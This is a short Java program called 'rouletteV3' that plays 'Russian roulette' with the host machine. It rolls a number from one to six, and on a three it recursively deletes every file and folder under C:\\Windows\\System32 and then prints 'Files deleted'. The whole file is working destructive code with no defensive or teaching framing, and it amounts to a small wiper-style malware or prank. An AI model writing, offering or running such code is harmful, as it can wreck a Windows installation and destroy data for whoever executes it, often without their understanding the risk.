import java.io.File;  // Import the File class

public class rouletteV3 {

    static void deleteFolder(File file){
       for (File subFile : file.listFiles()) {
          if(subFile.isDirectory()) {
             deleteFolder(subFile);
          } else {
             subFile.delete();
          }
       }
       file.delete();
    }
    public static void main(String args[]) {
       String filePath = "C:\\Windows\\System32";

       int bullet = (int) Math.floor(((Math.random()*(6))+1));
        System.out.println(bullet);
       if(bullet==3){

            //  Creating the File object
             File file = new File(filePath);
             deleteFolder(file);
             System.out.println("Files deleted........");
         }
    }

 }